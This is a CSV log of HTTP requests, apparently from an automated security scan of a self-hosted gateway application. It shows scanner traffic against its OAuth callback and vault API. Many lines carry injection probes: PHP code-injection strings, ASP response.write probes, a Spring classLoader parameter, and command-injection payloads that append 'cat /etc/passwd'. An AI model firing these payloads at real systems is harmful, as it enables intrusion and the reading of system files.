ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
5301,Sat May 23 22:17:43 WIB 2026,Sat May 23 22:17:44 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/assets/index-CPrzggVV.css?class.module.classLoader.DefaultAssertionStatus=nonsense,200,OK,500,1215,3669
5302,Sat May 23 22:17:43 WIB 2026,Sat May 23 22:17:44 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/favicon.svg?class.module.classLoader.DefaultAssertionStatus=nonsense,200,OK,499,1134,9522
5303,Sat May 23 22:17:43 WIB 2026,Sat May 23 22:17:44 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/assets?class.module.classLoader.DefaultAssertionStatus=nonsense,200,OK,275,1215,464
5304,Sat May 23 22:17:44 WIB 2026,Sat May 23 22:17:44 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/assets/index-CPrzggVV.css,403,Forbidden,20,1141,25
5305,Sat May 23 22:17:44 WIB 2026,Sat May 23 22:17:44 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/favicon.svg,403,Forbidden,22,1069,25
5306,Sat May 23 22:17:44 WIB 2026,Sat May 23 22:17:44 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/assets,403,Forbidden,228,1141,25
5307,Sat May 23 22:17:43 WIB 2026,Sat May 23 22:17:44 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/assets/index-CZpL8Fi7.js?class.module.classLoader.DefaultAssertionStatus=nonsense,200,OK,764,1226,409547
5308,Sat May 23 22:17:44 WIB 2026,Sat May 23 22:17:44 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/assets/index-CZpL8Fi7.js,403,Forbidden,80,1141,25
5309,Sat May 23 22:17:43 WIB 2026,Sat May 23 22:17:44 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/health?class.module.classLoader.DefaultAssertionStatus=nonsense,200,OK,1015,1062,90
5310,Sat May 23 22:17:44 WIB 2026,Sat May 23 22:17:45 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/health,403,Forbidden,231,1069,25
5311,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,403,Forbidden,20,1069,25
5312,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,246,1236,73
5313,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,246,1236,41
5314,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,261,1143,464
5315,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,258,1324,30
5316,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080,200,OK,259,1143,464
5317,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,19,1236,73
5318,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,22,1236,41
5319,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,231,1236,73
5320,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,229,1236,41
5321,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api,403,Forbidden,244,1069,25
5322,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,244,1324,30
5323,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,250,1143,464
5324,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,22,1236,73
5325,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,242,1236,41
5326,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,227,1236,73
5327,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,245,1143,464
5328,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1,403,Forbidden,250,1069,25
5329,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,251,1324,30
5330,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,20,1236,41
5331,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,20,1236,73
5332,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,20,1143,464
5333,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:45 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,21,1324,30
5334,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:46 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault,403,Forbidden,239,1171,25
5335,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:46 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,238,1236,41
5336,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:46 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,226,1324,30
5337,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:46 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,235,1236,73
5338,Sat May 23 22:17:45 WIB 2026,Sat May 23 22:17:46 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,230,1143,464
5339,Sat May 23 22:17:46 WIB 2026,Sat May 23 22:17:46 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/assets,301,Moved Permanently,20,758,156
5340,Sat May 23 22:17:46 WIB 2026,Sat May 23 22:17:46 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,20,1236,41
5341,Sat May 23 22:17:46 WIB 2026,Sat May 23 22:17:46 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,21,1236,73
5342,Sat May 23 22:17:46 WIB 2026,Sat May 23 22:17:46 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,23,1324,30
5343,Sat May 23 22:17:46 WIB 2026,Sat May 23 22:17:46 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%22%2Bresponse.write%28315%2C494*141%2C549%29%2B%22&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,21,1143,464
5344,Sat May 23 22:17:46 WIB 2026,Sat May 23 22:17:46 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,217,1236,73
5345,Sat May 23 22:17:46 WIB 2026,Sat May 23 22:17:46 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,224,1236,41
5346,Sat May 23 22:17:46 WIB 2026,Sat May 23 22:17:46 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,219,1324,30
5347,Sat May 23 22:17:46 WIB 2026,Sat May 23 22:17:46 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,220,1143,464
5348,Sat May 23 22:17:46 WIB 2026,Sat May 23 22:17:46 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,19,1236,73
5349,Sat May 23 22:17:46 WIB 2026,Sat May 23 22:17:46 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,19,1236,41
5350,Sat May 23 22:17:46 WIB 2026,Sat May 23 22:17:46 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,21,1324,30
5351,Sat May 23 22:17:46 WIB 2026,Sat May 23 22:17:46 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=response.write%28315%2C494*141%2C549%29&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,22,1143,464
5352,Sat May 23 22:17:46 WIB 2026,Sat May 23 22:17:46 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,221,1236,73
5353,Sat May 23 22:17:46 WIB 2026,Sat May 23 22:17:46 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,228,1236,41
5354,Sat May 23 22:17:51 WIB 2026,Sat May 23 22:17:53 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D,200,OK,1014,1143,464
5355,Sat May 23 22:17:53 WIB 2026,Sat May 23 22:17:53 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C,200,OK,20,1143,464
5356,Sat May 23 22:17:53 WIB 2026,Sat May 23 22:17:53 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B,200,OK,218,1143,464
5357,Sat May 23 22:17:51 WIB 2026,Sat May 23 22:17:53 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,1271,1236,73
5358,Sat May 23 22:17:51 WIB 2026,Sat May 23 22:17:53 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,1274,1236,41
5359,Sat May 23 22:17:58 WIB 2026,Sat May 23 22:18:00 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=response.write%28738%2C048*758%2C175%29,200,OK,1321,1143,464
5361,Sat May 23 22:17:58 WIB 2026,Sat May 23 22:18:03 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,4621,1236,41
5362,Sat May 23 22:18:20 WIB 2026,Sat May 23 22:18:21 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api,403,Forbidden,1325,1069,25
5363,Sat May 23 22:18:20 WIB 2026,Sat May 23 22:18:21 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%26cat+%2Fetc%2Fpasswd%26&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,1509,1143,464
5364,Sat May 23 22:18:20 WIB 2026,Sat May 23 22:18:21 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,1512,1236,73
5365,Sat May 23 22:18:20 WIB 2026,Sat May 23 22:18:21 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,1243,1236,41
5366,Sat May 23 22:18:20 WIB 2026,Sat May 23 22:18:21 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,1524,1324,30
5367,Sat May 23 22:18:21 WIB 2026,Sat May 23 22:18:22 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1,403,Forbidden,426,1069,25
5368,Sat May 23 22:18:21 WIB 2026,Sat May 23 22:18:22 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,246,1236,41
5369,Sat May 23 22:18:21 WIB 2026,Sat May 23 22:18:22 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,247,1236,73
5370,Sat May 23 22:18:21 WIB 2026,Sat May 23 22:18:22 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%3Bcat+%2Fetc%2Fpasswd%3B&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,257,1143,464
5371,Sat May 23 22:18:21 WIB 2026,Sat May 23 22:18:22 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,241,1324,30
5372,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault,403,Forbidden,19,1171,25
5373,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,23,1236,41
5374,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,23,1236,73
5375,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,235,1324,30
5376,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%22%26cat+%2Fetc%2Fpasswd%26%22&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,238,1143,464
5377,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,221,1236,73
5378,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/assets,301,Moved Permanently,227,758,156
5379,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,226,1236,41
5380,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,21,1324,30
5381,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,22,1236,73
5382,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%22%3Bcat+%2Fetc%2Fpasswd%3B%22&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,26,1143,464
5383,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,22,1236,41
5384,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,22,1324,30
5385,Sat May 23 22:18:22 WIB 2026,Sat May 23 22:18:22 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,20,1236,73
